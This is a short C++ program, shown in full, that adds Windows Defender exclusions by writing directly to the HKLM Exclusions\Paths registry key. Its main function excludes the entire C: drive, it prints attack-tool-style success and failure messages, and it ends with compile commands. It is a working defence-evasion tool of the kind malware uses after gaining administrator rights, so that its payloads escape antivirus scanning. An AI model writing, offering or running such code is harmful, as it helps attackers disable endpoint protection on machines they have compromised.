#include <windows.h>
#include <iostream>

// Adds a Windows Defender exclusion via direct registry write
// Requires: Admin or SYSTEM privileges
// Test: Check HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths in regedit

bool AddDefenderExclusion(const wchar_t* path) {
    HKEY hKey;
    LSTATUS status = RegOpenKeyExW(
        HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths",
        0,
        KEY_SET_VALUE,
        &hKey
    );

    if (status != ERROR_SUCCESS) {
        std::wcerr << L"[!] Failed to open registry key. Error: " << status << std::endl;
        std::wcerr << L"[!] Are you running as Admin/SYSTEM?" << std::endl;
        return false;
    }

    DWORD val = 0;
    status = RegSetValueExW(
        hKey,
        path,
        0,
        REG_DWORD,
        (BYTE*)&val,
        sizeof(DWORD)
    );

    RegCloseKey(hKey);

    if (status != ERROR_SUCCESS) {
        std::wcerr << L"[!] Failed to write registry value. Error: " << status << std::endl;
        return false;
    }

    std::wcout << L"[+] Exclusion added: " << path << std::endl;
    return true;
}

int main() {
    // Exclude entire C drive
    AddDefenderExclusion(L"C:\\");

    // Exclude specific folders
    // AddDefenderExclusion(L"C:\\Users\\Public");
    // AddDefenderExclusion(L"C:\\Temp");

    return 0;
}

// Compile:
//   MSVC:  cl exclusion.cpp advapi32.lib /Fe:exclusion.exe
//   MinGW: g++ -o exclusion.exe exclusion.cpp -ladvapi32
